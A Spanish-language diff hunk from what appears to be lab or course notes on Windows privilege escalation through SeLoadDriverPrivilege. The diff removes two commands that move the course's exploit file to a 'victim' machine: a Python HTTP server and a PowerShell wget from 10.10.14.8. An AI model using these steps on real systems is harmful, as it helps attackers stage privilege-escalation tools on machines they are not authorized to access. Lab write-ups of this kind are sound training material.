@@ -382,19 +382,8 @@ Observamos que esta vez el privilegio `SeLoadDriverPrivilege` aparece `Disabled`
 ---
 
 
-El siguiente paso es habilitar `SeLoadDriverPrivilege` con el archivo EnableSeLoadDriverPrivilege.cpp de la PoC que proporciona el curso.
+El siguiente paso es habilitar `SeLoadDriverPrivilege` con el archivo `EnableSeLoadDriverPrivilege.cpp` de la PoC que proporciona el curso.
 Pasamos el archivo `EnableSeLoardDriverPrivilege.cpp` a la máquina víctima:
-Máquina atacante:
-
-```bash
-python -m http.server 7777
-```
-Desde la máquina víctima abrimos una powershell sin elevar:
-
-```powershell
-wget "http://10.10.14.8:7777/EnableSeLoardDriverPrivilege.cpp" -outfile "EnableSeLoardDriverPrivilege.cpp`"
-```
-
 
 
 
